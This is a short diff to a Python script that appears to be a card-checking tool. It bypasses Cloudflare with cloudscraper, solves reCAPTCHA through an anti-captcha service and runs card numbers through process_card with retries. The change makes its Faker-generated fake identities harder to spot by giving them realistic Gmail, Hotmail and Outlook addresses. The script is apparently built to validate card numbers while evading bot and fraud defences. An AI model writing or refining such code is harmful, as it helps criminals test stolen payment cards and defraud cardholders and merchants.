@@ -30,9 +30,14 @@ import cloudscraper
 from anticaptchaofficial.recaptchav2proxyless import *
 import time
 def usuario() -> dict:
+    fake = Faker()
     number = random.randint(1111, 9999)
     postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
-    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }
+    dominios = ["gmail.com", "hotmail.com", "outlook.com"]
+
+    # Elegir dominio aleatorio
+    dominio = random.choice(dominios)
+    return { 'name' : Faker().name(), 'email': f"{fake.user_name()}{number}@{dominio}", 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }
 
 
 def capture(data, start, end):
@@ -396,4 +401,5 @@ async def process_card(card: str) -> str:
             print(e)
             retry_count += 1
     else:
+
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
